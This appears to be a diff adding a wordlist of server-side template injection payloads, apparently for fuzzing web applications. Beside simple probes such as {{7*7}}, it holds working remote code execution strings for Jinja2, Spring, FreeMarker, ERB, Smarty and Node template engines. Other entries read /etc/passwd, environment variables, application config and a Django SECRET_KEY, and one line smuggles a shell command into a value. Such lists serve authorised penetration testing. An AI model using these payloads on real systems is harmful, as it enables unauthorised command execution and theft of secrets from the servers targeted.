@@ -1,0 +1,48 @@
+${1+1}
+${7*7}
+${7*'7'}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+${{7*7}}
+${{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+#{1+1}
+#{7*7}
+#{7*'7'}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+%25%7B%7B7*7%7D%7D
+%7B%7B7*7%7D%7D
+*{7*7}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+1;cat /etc/passwd
+<%= 7*7 %>
+<%= File.open('/etc/passwd').read %>
+<%= system('id') %>
+<%=7*7%>
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.Runtime").getRuntime().exec("id")}
+@(1+2)
+@(7*7)
+@{7*7}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+a]concat[${7*7}
+p]#{7*7}[
+smart.js:{{7*7}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.class.mro()[1].subclasses()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{2*2}}[[5*5]]
+{{7*'7'}}
+{{7*7}}
+{{config}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.items()}}
+{{constructor.constructor('return this.process.mainModule.require("child_process").execSync("id")')()}}
+{{dump(app)}}
+{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{settings.SECRET_KEY}}
+{php}echo `id`;{/php}
+{system('id')}
+a]concat[${constructor.constructor('return this.process.mainModule.require("child_process").execSync("id")')()}
